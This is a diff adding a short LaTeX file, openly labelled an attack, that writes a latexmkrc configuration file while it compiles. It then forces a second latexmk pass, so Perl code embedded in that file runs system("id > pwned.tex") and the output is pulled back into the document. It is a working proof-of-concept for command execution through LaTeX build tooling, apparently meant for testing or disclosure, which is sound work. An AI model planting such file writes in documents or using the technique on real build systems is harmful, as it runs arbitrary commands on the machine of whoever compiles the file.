@@ -1,0 +1,12 @@
+% Writes a latexmk configuration (Perl, so arbitrary code) read by the next run of latexmk, and
+% forces that run with a reference resolved on the second pass.
+\documentclass{article}
+\newwrite\attack
+\begin{document}
+\immediate\openout\attack=latexmkrc
+\immediate\write\attack{system("id > pwned.tex");}
+\immediate\closeout\attack
+\section{Attack}\label{attack}
+See section~\ref{attack}.
+\IfFileExists{pwned.tex}{\input{pwned}}{\typeout{ATTACK: no pwned.tex}}
+\end{document}
